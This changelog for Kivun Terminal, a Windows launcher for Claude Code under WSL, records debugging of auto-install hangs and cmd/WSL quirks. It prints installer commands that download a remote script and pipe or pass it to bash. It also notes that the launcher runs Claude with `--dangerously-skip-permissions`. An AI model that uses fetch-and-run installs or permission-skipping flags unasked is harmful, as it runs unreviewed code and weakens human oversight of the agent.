# Changelog

All notable changes to Kivun Terminal are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [1.1.27] - 2026-04-27

Ninth iteration. v1.1.26's per-iteration logging revealed `ping 127.0.0.1 -n 6 > nul` itself was the hang point — polling fired exactly ONCE at `wait=0s` with rc=1, then silence for 4 minutes until the test killed it. Replaced with WSL-side `sleep`.

### Fixed: ping hang in `start /B`-detached context → use `wsl ... sleep 5` instead

CI run 25017580692 (v1.1.26) LAUNCH_LOG showed:
```
[20:23:53.81] INFO - install kicked off via setsid; polling for /tmp/kivun-install-rc
[20:23:53.95] DEBUG - poll iter wait=0s wsl_rc=1
                              ← silence for 4 min until test gave up at 20:28:02
```

Each polling iteration's `ping 127.0.0.1 -n 6 > nul` should take ~5 seconds. Instead it took 4+ minutes. Possible causes (all known to affect `ping` on Windows when stdin is a redirected file and stdout is detached): ICMP loopback denied, ping waiting for a console, ping reading stdin in some configurations.

Replaced with `wsl -d Ubuntu -- sleep 5 < nul 2>&1 >> "%LOG_FILE%"`. Same call pattern as every other working wsl invocation in this launcher (line 34, 194, 199, 666). WSL's Linux `sleep` doesn't depend on Windows-side TTY/console state.

Also flattened the `if INSTALL_WAIT >= 660 (...)` cap block to goto-based flow to avoid cmd's known if-block parens-counting edge cases.

### Lesson

Tools that "should" work without a TTY don't always: `timeout.exe` (v1.1.25 fix), `ping.exe` (this fix). When polling from cmd.exe in a `start /B`-detached, file-stdin context, the safest sleep is to delegate it to a known-working subprocess — for this launcher, that's `wsl ... sleep N`. Adding to launcher-bulletproofing memory: **avoid Windows-native sleep utilities (timeout, ping) in detached cmd contexts; use `wsl ... sleep` instead.**

## [1.1.26] - 2026-04-27

Eighth iteration. v1.1.25's `ping`-based polling worked (launcher_stderr now empty, no more "Input redirection" errors), but the test STILL failed even though `/root/.local/bin/claude` was successfully installed. v1.1.26 adds per-iteration polling diagnostics + a longer test timeout.

### Changed: per-iteration polling diagnostic + test timeout 120s → 240s

CI run 25017204704 (v1.1.25) confirmed:
- launcher_stderr.txt is **empty** — `ping` fix solved the timeout-rejection issue
- `/root/.local/bin/claude → versions/2.1.119` exists at install completion (timestamp 20:15)
- Polling kickoff log fires: `INFO - install kicked off via setsid; polling for /tmp/kivun-install-rc`
- Polling LOG line `INFO - install.sh returned exit code N` **never appears**

The launcher's polling is silent — we can't tell if it's iterating, what wsl returns each time, or if it's stuck. v1.1.26 adds `DEBUG - poll iter wait=Xs wsl_rc=N` log line per iteration so we can diagnose without guessing.

Also bumped the test's polling cap from 120s to 240s. Real users on warm PCs are fine in 30-90s, but a cold CI runner has WSL-boot + curl + native-build + symlink overhead — could plausibly take 2-3 min total. The launcher's own cap is 660s so 240s for the test stays under that.

### Match working redirect pattern in polling

Switched polling line from `< nul >> "%LOG_FILE%" 2>&1` to `< nul 2>&1 >> "%LOG_FILE%"` — the former is what we wrote in v1.1.24/v1.1.25 but the latter is what every working `< nul`-using line in this launcher actually uses (lines 34, 194, 199, 666). Empirically the latter is reliable; the former may have parser-order edge cases.

## [1.1.25] - 2026-04-27

Seventh hot-fix in the same day. Found the real culprit: `timeout.exe`, NOT `wsl.exe`, was producing all the "Input redirection is not supported" errors across v1.1.21–v1.1.24's failed CI runs.

### Fixed: replace `timeout /t 5 /nobreak` with `ping 127.0.0.1 -n 6` in polling loop

CI run 25016792585 (v1.1.24) confirmed `setsid -f` install was actually working — `/root/.local/bin/claude → versions/2.1.119` was created. The polling loop was the only blocker. Detailed analysis of `launcher_stderr.txt` showed only ~9 "Input redirection" errors despite the polling loop running for 120 seconds at a 5s interval (which would produce ~24 if each iteration errored once). That mismatch led to the realization: the error was from **`timeout.exe`**, Windows' built-in sleep utility, NOT from `wsl.exe`. `timeout` requires a TTY for stdin and rejects file-stdin with the EXACT same error message as wsl.exe's known rejection.

The launcher inherits stdin from `start /B cmd /c "... < launcher_input.txt"` (CI test) or from a redirected console (real `start /B` users), so `timeout`'s TTY check fails. cmd's classic workaround is `ping 127.0.0.1 -n 6 > nul` — `ping` does NOT require a TTY and waits ~5s for 6 echo replies (about 1s apart on localhost).

Also: polling now checks the claude binary directly (`test -x /root/.local/bin/claude || ...`) in addition to the `/tmp/kivun-install-rc` marker. If `taskkill //IM wsl.exe` wipes /tmp (tmpfs) before we read the marker, the binary still exists in `/root/.local` (persistent), so we can verify success regardless. INSTALL_RC defaults to 0 if the marker is missing but the binary is present.

### Lesson

`timeout /t N /nobreak` is the Windows-cmd canonical sleep, but it requires a TTY for stdin. In any context where the launcher's stdin is a file (CI tests, `start /B`, redirected real-user invocations), `timeout` fails immediately with a confusing error message identical to one wsl.exe also produces. **Always use `ping 127.0.0.1 -n N+1 > nul` for cmd sleeps** — it works with any stdin source.

Six wasted version bumps (v1.1.19 → v1.1.24) chasing wsl.exe behavior. The actual fix was a one-line swap in the polling loop. Lesson added to launcher-bulletproofing memory: when an error message is ambiguous about which binary produced it, audit ALL invocations near the error, not just the most-recently-changed one.

## [1.1.24] - 2026-04-27

Sixth hot-fix in the same day. v1.1.23's `setsid -f` detachment WORKED — `/root/.local/bin/claude` was actually installed in CI (run 25016464334 confirmed). But the polling loop's `wsl ... bash -c "test -f file" >> "%LOG_FILE%" 2>&1` was rejected by wsl.exe with `ERROR: Input redirection is not supported`. So polling never saw the marker, the launcher never logged SUCCESS, the test failed even though Claude WAS installed.

### Fixed: polling needs `< nul`; setsid kickoff doesn't

Discovered subtle wsl.exe 2.6.x rule: `bash -c` calls inherit launcher's stdin (a redirected file in CI / `start /B` contexts), and wsl.exe rejects file-stdin for `bash -c` even when stdout/stderr ARE redirected. The fix is `< nul` before the stdout redirect.

But `wsl ... setsid -f bash <script>` (NOT via `bash -c`) does NOT trigger the same check — wsl.exe accepts file-stdin for non-bash-c commands.

So the kickoff (line 663, `setsid -f bash <script>`) works without `< nul`. The polling (line 676, `bash -c "test -f file"`) needs `< nul`. Added it.

### CI status after this fix

If CI still fails, the next layer to check is whether `/tmp/kivun-install-rc` exists when polling fires. v1.1.24's diagnostic dump now also `cat`'s `/tmp/kivun-install-rc` so we can verify the install runner's output regardless of polling status.

## [1.1.23] - 2026-04-27

Fifth hot-fix in the same day for the auto-install path. v1.1.21 (detach + poll) was architecturally right but the implementation kept failing in different ways. v1.1.23 finally lands a working version by shipping a static install runner script and using `setsid -f` for true session detachment.

### Fixed: auto-install actually runs in the background and survives wsl.exe exit

CI run 25015901486 (v1.1.22) revealed two distinct bugs in the v1.1.21/v1.1.22 detach approach:

1. **Detached subshell never executed.** Even though `wsl.exe` returned 0 from the kickoff call, `/root/.local/bin/claude` did not exist. WSL's interop relay (the process inside Ubuntu that wsl.exe communicates with) kills its cgroup descendants when wsl.exe exits. `& disown` only tells bash's job table not to send SIGHUP — it does NOT escape the cgroup. The detached subshell was killed before it could run install.sh.

2. **Polling loop blocked by wsl.exe rejection.** `wsl ... bash -c "test -f file" < nul > nul 2>&1` was rejected with `ERROR: Input redirection is not supported, exiting the process immediately.` Only `< nul >> file 2>&1` is accepted by wsl.exe 2.6.x; `< nul > nul 2>&1` is not.

**Fix:** ship `payload/kivun-install-claude.sh` as a static install runner, invoke via `wsl -d Ubuntu -- setsid -f bash <path>`:

```sh
# payload/kivun-install-claude.sh
#!/bin/bash
rm -f /tmp/kivun-claude.log /tmp/kivun-install-rc
{
  timeout 600 bash -c '
    curl -fsSL https://claude.ai/install.sh -o /tmp/claude-installer.sh \
      && bash /tmp/claude-installer.sh
    rc=$?
    rm -f /tmp/claude-installer.sh
    exit $rc
  '
} > /tmp/kivun-claude.log 2>&1
echo $? > /tmp/kivun-install-rc
```

`setsid -f` forks AND creates a new session — the install becomes a session leader, fully orphaned from wsl.exe's session and cgroup, so it survives wsl.exe's exit. cmd polls `/tmp/kivun-install-rc` every 5s (cap 660s). `< nul` is dropped from the new wsl calls entirely — the inner commands don't read stdin so it's unnecessary.

Also added `kivun-install-claude.sh` to the NSIS installer's File and Delete lists so it ships in the installed payload.

### Lessons (added to launcher-bulletproofing memory)

1. **`& disown` is not enough to detach from wsl.exe.** WSL's interop relay maintains cgroup ownership of all descendants. To survive wsl.exe exit, a process must escape the cgroup via `setsid` (new session) or `systemd-run` (new scope).
2. **wsl.exe 2.6.x has unintuitive stdin-redirect rules.** `< nul >> "%LOG_FILE%" 2>&1` is accepted; `< nul > nul 2>&1` is rejected. Easiest workaround: avoid `< nul` entirely when the inner command doesn't need stdin closed.
3. **Multi-line bash logic belongs in a static .sh, not inline in a `bash -c` string.** Five releases of debugging trace back to nested cmd→bash→bash quoting. A `payload/<name>.sh` file installed alongside the launcher avoids the entire quoting problem.

## [1.1.22] - 2026-04-27

Fourth hot-fix in the same day for the auto-install path. v1.1.21's detach + poll architecture was correct, but the new wsl kickoff call used a `< nul` stdin redirect without a paired stdout redirect — and `wsl.exe 2.6.x` rejects that combination with `ERROR: Input redirection is not supported, exiting the process immediately.` So the install never started.

### Fixed: `< nul` without paired stdout redirect makes wsl.exe reject the call

CI run 25015480190 was definitive:
- LAUNCH_LOG ends at `INFO - Auto-installing Claude` (same place as before)
- `/root/.local/bin/claude` does **not** exist (different from v1.1.20: install never ran)
- `launcher_stderr.txt` contains ~30 lines of `ERROR: Input redirection is not supported, exiting the process immediately.` — one per polling iteration plus the kickoff call

Every other `< nul` call in `payload/kivun-terminal.bat` pairs `< nul` with `2>&1 >> "%LOG_FILE%"` (lines 34, 133, 147, 194, 199, 666, 671). I missed that pattern when adding the v1.1.21 detach call (line 633) and polling call (line 640). v1.1.22 matches the established pattern:

- Line 633 (kickoff): append `>> "%LOG_FILE%" 2>&1` after `< nul`
- Line 640 (poll): change `< nul 2>nul` to `< nul > nul 2>&1`

Also added an immediate `%ERRORLEVEL%` check after the kickoff: if wsl.exe rejects the call, fail fast in <1s via the npm fallback path instead of polling fruitlessly for 660s.

### Lesson

Cmd-side I/O patterns are non-orthogonal: stdin redirection alone (`< nul`) can be rejected by some Windows binaries (including `wsl.exe`) when stdout is left attached to a tty. Always pair `< nul` with explicit stdout/stderr redirection. Added to launcher-bulletproofing memory: **never use `< nul` without a paired `>> file 2>&1` (or `> nul 2>&1`) on Windows binaries that may check for tty.**

## [1.1.21] - 2026-04-27

Third hot-fix in the same day for the auto-install hang. v1.1.19 (added `timeout 600` + `tee`) and v1.1.20 (dropped `tee`, kept file redirect) both improved the path but neither made `wsl.exe` reliably return after install completes. CI artifact (run 25014868847) was definitive: claude binary on disk, install COMPLETE, but `wsl.exe` still alive 2 minutes later. v1.1.21 stops waiting for `wsl.exe` at all.

### Fixed: launcher cannot hang on auto-install regardless of what install.sh does

**Root cause analysis.** v1.1.20's diagnostic dump showed:
- `/root/.local/bin/claude → versions/2.1.119` exists immediately after install (timestamped 19:23, install kicked off at 19:23:25 — install completes in seconds)
- LAUNCH_LOG ends at `INFO - Auto-installing Claude (AUTO_INSTALL_CLAUDE=yes)` — the next expected line `INFO - install.sh returned exit code N` (line 629 of the .bat) is **never written**
- launcher_stdout ends at `Installing Claude Code in Ubuntu (max 10 min)...` — also silent
- `wsl.exe` was still alive when the test killed it at 2 min mark

The bash subshell that runs the install **exits cleanly**, but `wsl.exe` doesn't follow it out. Possible causes (any one of which would block `wsl.exe`):
1. `claude.ai/install.sh`'s "native build" execs a post-install hook that inherits the wsl-side pty fd
2. install.sh forks a daemon in the same process group that wsl.exe is monitoring
3. WSL's interop relay holds a reference until the orphan group exits

We can't fix any of these from the launcher side, and they may evolve as Anthropic ships further install.sh changes.

**Fix in `payload/kivun-terminal.bat` `:_do_install`:** stop relying on `wsl.exe` returning. Detach the install entirely:

```
wsl -d Ubuntu -- bash -c "rm -f /tmp/kivun-claude.log /tmp/kivun-install-rc; ( timeout 600 bash -c '...install...' > /tmp/kivun-claude.log 2>&1; echo $? > /tmp/kivun-install-rc ) </dev/null >/dev/null 2>&1 & disown"
```

The `( ... ) </dev/null >/dev/null 2>&1 & disown` runs the install in a backgrounded subshell whose stdin/stdout/stderr are all closed before `& disown` removes it from the outer bash's job table. The outer `bash -c` has nothing left to wait for, exits, `wsl.exe` returns to cmd in <1s.

The detached subshell continues running:
- `timeout 600 bash -c '...install...' > /tmp/kivun-claude.log 2>&1` runs the install with output captured
- After it exits (success, failure, or 600s timeout = exit 124), `echo $? > /tmp/kivun-install-rc` writes the exit code

cmd polls every 5s for the marker file (`wsl -- bash -c "test -f /tmp/kivun-install-rc"`), reads the exit code when it appears, and proceeds with verify or npm fallback. **No synchronous `wsl.exe` wait anywhere in the install path** — the launcher cannot hang regardless of what install.sh forks.

Cap: 660s of polling (= 600s install + 60s slack), then assume the subshell is wedged and fall through to npm fallback.

### Also: fixed CI diagnostic dump's `tasklist //FI` syntax

With workflow-level `MSYS_NO_PATHCONV=1` and `MSYS2_ARG_CONV_EXCL='*'`, `//FI` is preserved literally instead of being collapsed by Git-Bash's MSYS layer to `/FI`. tasklist rejects `//FI` with `Invalid argument/option`. Changed to single `/FI`.

### Lesson

Three releases in one day — v1.1.19, v1.1.20, v1.1.21 — to chase a hang that turned out to need a fundamentally different approach (give up on `wsl.exe` returning) rather than tweaks to the same approach (drop pipe, drop redirect, etc.). Lesson added to launcher-bulletproofing memory: **for any wsl-invoked command that runs user-supplied installer scripts, assume `wsl.exe` may not return, and detach by default.** Trust nothing about pty/fd/process-group cleanup that depends on the inner script's good behavior.

## [1.1.20] - 2026-04-27

Follow-up to v1.1.19. The same `test-no-claude-accept-install` job that v1.1.19 was supposed to make pass kept failing — and the new fail-fast diagnostic dump revealed the actual reason: install COMPLETED on disk (`/root/.local/bin/claude` symlink existed) but `wsl.exe` never returned to cmd, so the launcher never logged `INFO - install.sh returned exit code N` and never reached `SUCCESS - Claude Code installed in WSL`. v1.1.19's `tee` was holding the launcher hostage to an orphaned grandchild process inside the install.

### Fixed: launcher hangs AFTER auto-install completes successfully

**Symptom:** identical user-visible behavior to v1.1.19's hang ("Auto-installing Claude" → silent freeze), but with a different cause and farther along the install process. CI artifact (run 25002708236):
- `/root/.local/bin/claude → versions/2.1.119` exists on disk after install — install.sh **succeeded**.
- LAUNCH_LOG ends abruptly at `Installing Claude Code native build latest...`.
- Expected next launcher line `INFO - install.sh returned exit code N` **never written**.
- `/tmp/kivun-claude.log` is **empty/missing** despite stdout flowing to terminal.
- `wsl.exe` was still alive when the test killed the launcher 2 minutes later.

**Cause:** `claude.ai/install.sh`'s "native build" path forks a post-install hook (npm-style daemon or similar) that **inherits the parent shell's stdout file descriptor**. v1.1.19's `... | tee /tmp/kivun-claude.log` keeps that pipe open as long as ANY process on the write-end is alive. When the install's main process exits, the orphaned grandchild keeps the pipe open, `tee` blocks indefinitely on read, the bash subshell waits for `tee`, and `wsl.exe` waits for bash. Net effect: the install succeeds but `wsl.exe` never returns to cmd, `%ERRORLEVEL%` is never set, and the launcher never advances to its post-install logging.

**Fix in `payload/kivun-terminal.bat` `:_do_install`:** drop the pipe entirely. Replace `| tee /tmp/kivun-claude.log; exit ${PIPESTATUS[0]}` with `> /tmp/kivun-claude.log 2>&1 < /dev/null`. The redirection happens **inside** WSL, written by the install's bash subshell directly. `wsl.exe` returns as soon as the timeout subshell exits, regardless of any orphaned background processes that inherited stdout. Trade-off: install output no longer streams visibly to the user during the install — they see "Installing Claude Code in Ubuntu (max 10 min)..." then ~30-90 seconds of silence, then either `SUCCESS - Claude Code installed in WSL` or the npm fallback. Acceptable trade since the alternative is hang-forever.

### Improved: CI diagnostic dump now covers `test-claude-discovery-from-bashrc` too

`test-claude-discovery-from-bashrc` was hanging silently in the same v1.1.19 run with LAUNCH_LOG truncated at `Reading config.txt`. The 5-min wait + 1-line `FAIL` message it printed told us nothing useful. v1.1.20 mirrors the comprehensive dump pattern from `test-no-claude-accept-install` into the discovery test: 2-min fail-fast, then dump LAUNCH_LOG, launcher_stdout, launcher_stderr, the staged config.txt (via `od -c` to expose CR/LF/BOM issues), the WSL discovery probes re-run as root (so we see what the launcher SHOULD have seen), the relevant .bat lines (sanity check), and live tasklist. Future hangs in this job will be diagnosable in 2 minutes instead of 5.

### Lesson

v1.1.19 was diagnosed correctly (real install hang), but the fix introduced a new failure mode (pipe-held-open by orphaned grandchild). Two takeaways added to launcher-bulletproofing memory:

1. **Don't pipe output of WSL-side commands that may fork**. If install/build/setup scripts can fork background processes that inherit stdout, the pipe will outlive the main process. Redirect to a file instead — the file gets the bytes, the fd gets closed when the subshell exits.
2. **Every CI job that exercises the launcher needs a comprehensive failure dump, not just `cat $log`.** The single-line FAIL output from `test-claude-discovery-from-bashrc` cost us ~3 hours of guessing what hung; the comprehensive dump in `test-no-claude-accept-install` localized the v1.1.19 bug in 2 minutes.

## [1.1.19] - 2026-04-27

Real-user-reported hang: launcher freezes indefinitely at "Auto-installing Claude" when Anthropic's `claude.ai/install.sh` runs under the launcher's prior invocation pattern. CI reproduced the same hang on the same day, confirming user reports.

### Fixed: launcher hangs forever during Claude auto-install

**Symptom (real user, 2026-04-27):** running the launcher on a fresh WSL Ubuntu without Claude pre-installed: cmd window prints "Auto-installing Claude (AUTO_INSTALL_CLAUDE=yes)" and "Installing Claude Code via official installer (~1-2 min)..." then sits there forever. No further output, no error, no exit. User force-quit after waiting.

**Cause:** Anthropic shipped a new "native build" `install.sh` today which behaves differently when invoked under the prior launcher pattern. The launcher ran:

```
wsl -d Ubuntu -- bash -c "curl ... | bash > /tmp/kivun-claude.log 2>&1" < nul
```

— output redirected to a file (so user sees nothing happening), stdin closed via `< nul`. The new install.sh under that combination of `[ -t 0 ]`/`[ -t 1 ]` conditions hangs indefinitely. Confirmed via CI artifact: LAUNCH_LOG.txt ended at "Auto-installing Claude" with NO further launcher progress for 15+ minutes; `/tmp/kivun-claude.log` inside Ubuntu stayed empty even though wsl was still alive — curl never wrote a byte. Other CI jobs that pre-install Claude OUT OF the launcher (with output visible, no `< nul`) finish in ~30 seconds, so install.sh itself is fine; only the launcher's specific invocation triggered the hang.

**Fix in `payload/kivun-terminal.bat` `:_do_install`:**

1. **`timeout 600`** wraps the install — if anything hangs, the launcher recovers cleanly after 10 minutes (exit 124) and falls through to the npm fallback. The launcher can never freeze indefinitely on this path again.
2. **`| tee /tmp/kivun-claude.log`** replaces `> /tmp/... 2>&1`. Install output streams visibly to the user (so they see progress and know the launcher hasn't frozen) AND is captured for postmortem. The invisible-redirect was the proximal trigger for the new install.sh's hang behavior.
3. **Removed `< nul`**. install.sh doesn't read stdin in any version we've tested, but `< nul` may have been tickling the new version's interactive-vs-non-tty detection. With cmd's stdin already inherited from the .bat console (no fresh prompt fires until later), this is safe.
4. **`PIPESTATUS[0]`** propagates the timeout/install exit code through tee (tee always exits 0; without PIPESTATUS we'd never see install failures).
5. **Logged `INFO - install.sh returned exit code N`** AFTER the install command, plus a dedicated `WARNING - install.sh hit 600s timeout` line on exit 124. So future LAUNCH_LOG postmortems will show whether the install completed, failed, or timed out.

### CI coverage

PR #60's `test-no-claude-accept-install` job exercises this path end-to-end: fresh Ubuntu, no Claude, AUTO_INSTALL_CLAUDE=yes default, launcher runs, Claude auto-install must complete in <15 min and the launcher must log `SUCCESS - Claude Code installed in WSL`. With v1.1.18 + the new install.sh that test hung at 15 min and was marked `continue-on-error`. v1.1.19 removes the `continue-on-error` and the test must pass.

### Lesson

Real-user hangs that "happen at my user's PC" are not always reproducible elsewhere — but on the same day Anthropic shipped behavior changes to `install.sh`, CI started reproducing the exact same hang. The proximal cause was upstream behavior change; the launcher's defense (visible output + bounded timeout + clean fallback) had to be hardened to survive future upstream changes too. Updated launcher-bulletproofing memory: every external command the launcher invokes needs a timeout cap and visible output streaming, regardless of how reliable the external command was historically.

## [1.1.18] - 2026-04-27

CI coverage added in PR #60 (the `validate-launcher-windows.yml` jobs that exercise the v1.1.14/v1.1.15/v1.1.16 launcher paths) caught a real production bug that no prior release surfaced: **the direct-fallback path runs with empty environment variables when Konsole apt-install fails.**

### Fixed: Konsole-install-fail → silent broken launch (the bug PR #60 caught)

**Symptom:** when `apt-get install -y konsole` failed inside WSL — possible on a CI runner with no GUI, on a flaky apt mirror, on a machine without sudo cached, or behind a network outage — the launcher logged `ERROR - Konsole installation failed`, then `INFO - Falling back to direct Claude execution`, then `INFO - Executing: claude --append-system-prompt`, then `COMPLETE - Claude session ended`. The user saw the launch "succeed" but no Claude window appeared.

**Cause:** the `goto :run_direct` at line 225 of `kivun-terminal.bat` jumped past:
- the path conversion block (which sets `WSL_PATH` and `INST_WSL`)
- the WSLg-user detection block (which sets `WSL_USER_FLAG`)

So `:run_direct` invoked `wsl -d Ubuntu bash kivun-direct.sh "" "<prompt>"` — bash with no `INST_WSL` prefix on the script path. WSL bash inherits cmd's cwd (the Windows install dir, mapped to `/mnt/c/Users/.../AppData/Local/Kivun-WSL/` or wherever cmd was running), looks for `kivun-direct.sh` relative to that cwd, doesn't find it, exits silently. The launcher logs `COMPLETE - Claude session ended` regardless because the wsl invocation's exit code wasn't checked — the same anti-pattern v1.1.1 was supposed to kill but only addressed for the `claude not found` branch.

**Fix:** moved the path conversion + line-ending fix + VcXsrv check + bash log path + WSLg-user detection blocks to **before** the Konsole check in `payload/kivun-terminal.bat`. Now both the Konsole-launch path and the direct-fallback path run with the same fully-resolved `WSL_PATH` / `INST_WSL` / `WSL_USER_FLAG`. As a side benefit, the v1.1.15 abort (no UID 1000 user) now fires before we try to install Konsole, instead of after — so users in that scenario don't watch a 30-second apt run before being told to create a non-root user.

**Why no earlier release caught this:** every prior CI job (`test-no-claude-no-konsole`, `test-existing-claude-no-reinstall`, etc.) either pre-installed Konsole or asserted on the pre-Konsole code path. The new `test-v1115-abort-and-v1116-dot-fallback` and `test-v1115-routes-through-uid-1000` jobs in PR #60 both exercise the **Konsole-install-fail → direct-fallback** path end-to-end, and immediately exposed that the v1.1.16 dot-fallback marker and the v1.1.15 user-detection markers never appeared in the log because the goto jumped over them.

### Lesson learned (added to launcher-bulletproofing memory)

`goto :label` in cmd is a one-way trapdoor. Any code after the call site that the goto jumps over might as well not exist for the post-goto code. When adding new launcher invariants (path conversion, user detection, etc.), put them BEFORE all conditional gotos that lead to paths needing those invariants — not after, with the assumption that the goto path will redo or skip the work. The "happy path runs every line; error paths skip lines" mental model is wrong for cmd.

### CI coverage already covers this fix

PR #60's three new jobs assert the post-fix behavior:
- `test-v1115-abort-and-v1116-dot-fallback`: now reaches the v1.1.16 `Path conversion returned '.'` log line on a `.` arg, and reaches the v1.1.15 abort message when no UID 1000 exists. Both were previously skipped by the goto.
- `test-v1115-routes-through-uid-1000`: now reaches the v1.1.15 `Will run as: kivuntest` log line. Previously skipped.
- `test-sh-scripts-refuse-root`: regex assertion fixed in PR #60 to match the actual `wsl -d Ubuntu --user root -- adduser yourname` message.

After v1.1.18 lands on main, PR #60 will rebase clean and turn green.

## [1.1.17] - 2026-04-27

Two regressions that surfaced from real install testing of v1.1.16. Both were caused by code I shipped in v1.1.16; both are fixed here.

### Fixed: v1.1.16 updater bat shipped LF-endings .bat → cmd silently skipped half the launcher

**Symptom:** users who ran `Kivun-Update-To-V1116.bat` reported the working directory was wrong (landed in `/home/<user>` instead of `%USERPROFILE%`-converted `/mnt/c/Users/<user>`), the icon didn't show, and Claude asked to trust the folder on every launch (because it was a different folder than before).

**Cause (the actual root, found by counting CRs in the deployed file):** the v1.1.16 updater downloaded `kivun-terminal.bat` via `curl -fsSL` from GitHub raw. **GitHub raw serves files with the repository's storage line endings — LF on Linux-flavored repos.** The original NSIS installer wraps shipped files in CRLF, but the updater didn't normalize. Result: the deployed `kivun-terminal.bat` had ALL LF endings (verified: 0 lines with `\r$` out of 658 total). cmd is *partially* tolerant of LF-only `.bat` files — some lines run, some don't — and the symptom is silent. In practice the `WORK_DIR` setup at line 53, the config-file read at line 80, and ~10 other early `:LOG` calls were all skipped, so the launcher fell through to the v1.1.16 path-conversion fallback (`~`) instead of the proper `%USERPROFILE%` branch.

**Fix in v1.1.17 updater:** explicitly normalizes the downloaded `.bat` to CRLF inside WSL via `tr -d '\r' | sed 's/$/\r/'` after `curl`. Belt-and-suspenders fix in `kivun-terminal.bat` itself: when `WORK_DIR` is empty or `.`, substitute `%USERPROFILE%` upstream BEFORE `wslpath` (instead of falling back to `~` after `wslpath` returns `.`). So even if a future updater bug ships LF-endings again, the launcher's surviving fragments still land users at their Windows home, not WSL home.

### Fixed (also retracted v1.1.16's "architectural limit" claim): Konsole window has no taskbar icon under WSLg

**v1.1.16 incorrectly documented the missing taskbar icon as a WSLg architectural limit.** It isn't. WSLg sets the Windows taskbar icon by matching window WM_CLASS (or Wayland app_id) against installed `.desktop` files' `StartupWMClass=` entry — a different mechanism than X11's `_NET_WM_ICON` (which the v1.1.7 path correctly sets but WSLg ignores). Konsole's default WM_CLASS is `konsole`, which matches the system's `org.kde.konsole.desktop` and uses Konsole's bundled icon — NOT ours.

**Fix in v1.1.17 `kivun-launch.sh`:**
1. Generates `~/.local/share/applications/kivun-terminal.desktop` with `Icon=<absolute path to kivun-icon.png>` and `StartupWMClass=kivun-terminal`.
2. Launches Konsole with `--name kivun-terminal` (Qt's WM_CLASS res_name flag).
3. WSLg matches the `kivun-terminal` WM_CLASS to our `.desktop` and uses our PNG for the Windows taskbar icon. Verified working April 27, 2026.

The original `python-xlib` `_NET_WM_ICON` path still runs as a fallback for users on `USE_VCXSRV=true` — VcXsrv reads `_NET_WM_ICON` directly. The two paths are complementary: `.desktop` for WSLg installs (the v1.1+ default), `_NET_WM_ICON` for VcXsrv installs.

### Lesson learned (carried into the launcher-bulletproofing memory entry)

When a doc says something is "architecturally not fixable", check first whether you've explored ALL the platform's mechanisms — not just the one you tried. v1.1.16 declared WSLg icon-setting unfixable based on testing two `_NET_WM_ICON` paths. The actual answer was a third mechanism (`.desktop` + WM_CLASS) that's the *standard* way Linux desktops associate icons with applications. "Not fixable" claims should require active disproof of all known APIs, not "I tried two things and they didn't work."

Also: when shipping an updater that pulls files from GitHub raw, ALWAYS normalize line endings explicitly. The repo-side storage endings are not the same as the installer-bundled endings.

## [1.1.16] - 2026-04-27

Two user-reported issues from real install testing on April 27, 2026.

### Fixed: working directory was the install dir instead of `$HOME` / right-clicked folder

**Symptom:** Konsole opened with the working directory set to `/mnt/c/Users/<you>/AppData/Local/Kivun-WSL` (the Kivun install directory) instead of your home directory or the folder you right-clicked.

**Cause (verified April 27, 2026 in WSL 2.6.3.0):** `wslpath ""` and `wslpath "."` both return the literal `.` string instead of empty. The .bat's check was `if "%WSL_PATH%"==""` (empty only) so a `.` value slipped through, got passed to bash, and `cd .` kept whatever cwd bash inherited from cmd — typically the install dir when launched via the Desktop shortcut.

**Fix:** added `if "%WSL_PATH%"=="."` fallback to the same home-directory-fallback branch in `payload/kivun-terminal.bat`. WORK_DIR upstream is also the harder fix to chase ("who is passing `.` or empty as `%~1`?"), but the defensive check at WSL_PATH covers both `wslpath` quirk cases regardless of upstream cause.

### Investigated and documented: Konsole title-bar/taskbar icon is blank under WSLg

**Symptom:** title bar and Windows taskbar entry for the Konsole window are blank/white instead of showing the orange Claude icon. Logs say `SUCCESS - Window icon set` but visually nothing.

**Diagnosis (verified via xprop on the live window):** the python-xlib path *does* set `_NET_WM_ICON` correctly with all four icon sizes (16/32/48/64) and valid pixel data. Confirmed via `xprop -name "Kivun Terminal" _NET_WM_ICON` showing the orange figure clearly in the ASCII preview. **WSLg's compositor (Weston → RDP → Windows) does not forward `_NET_WM_ICON` to either the title bar or the Windows taskbar.** Tried `--qwindowicon <path>` as a Qt-native alternative (sets the icon at Qt application level before X11 window creation) — also ignored by WSLg.

**Status:** WSLg architectural limit. Not Kivun-fixable. Documented in `docs/TROUBLESHOOTING.md`. **Native Linux KDE/GNOME installs are unaffected** — they show the icon correctly via `_NET_WM_ICON`. Only WSLg installs (most Windows Kivun users) get a blank Konsole-window icon, with the cmd "Launch Log" window keeping its icon from the Windows shortcut `.lnk` file.

The `--qwindowicon` experiment is removed from `payload/kivun-launch.sh` (was added speculatively earlier today) but a comment block remains explaining why we tried it and why it doesn't help, so future agents don't re-derive the failed spike.

### Why two issues were investigated together

User reported them in close succession during v1.1.15 testing. The path issue is the meaningful fix; the icon issue is a documented limit. Bundling both lets the v1.1.16 release ship the path fix immediately AND give a clear "this is what we tried, this is why it can't be fixed from our side" answer for the icon question.

## [1.1.15] - 2026-04-27

v1.1.14 was incomplete. Same user (`mipmip`) re-ran the launcher after the v1.1.14 update and **the same `--dangerously-skip-permissions cannot be used with root/sudo privileges` error happened again**, this time via the *fallback* path. Two bugs missed in v1.1.14:

1. **The WSLG_USER==root branch only triggered when WSLg ownership detection EXPLICITLY returned the string "root".** On mipmip's machine the detection returned **empty** (`WARNING - Could not detect WSLg owner, using default user` in the log), so the fallback never fired. The wsl invocation then ran with no `--user` flag, defaulting to root, where Claude refused.
2. **The direct-fallback path (line 458 of `kivun-terminal.bat`) ran `wsl -d Ubuntu bash kivun-direct.sh ...` with no `--user` flag at all** — bypassing whatever WSL_USER_FLAG the WSLg detection had set. So even if the Konsole launch path used a non-root user, the direct fallback when Konsole failed still went to root.

### Fixed

- **`payload/kivun-terminal.bat` v1.1.15**: simpler, exhaustive WSLG_USER detection. Discard any "root" or empty result; query `wsl --user root -- id -un 1000` to find the conventional first non-root user; if that's also empty, abort with the same copy-paste-able instructions for creating a non-root user. The logic is intentionally **flat** (no nested `if (...)` blocks containing `%VAR%` references) so cmd's parse-time vs runtime variable expansion can't introduce bugs the v1.1.14 nested-if version was vulnerable to.
- **`payload/kivun-terminal.bat` line 458**: direct-fallback path now passes `%WSL_USER_FLAG%` to wsl, mirroring the Konsole launch path. Both paths get the same resolved non-root user.
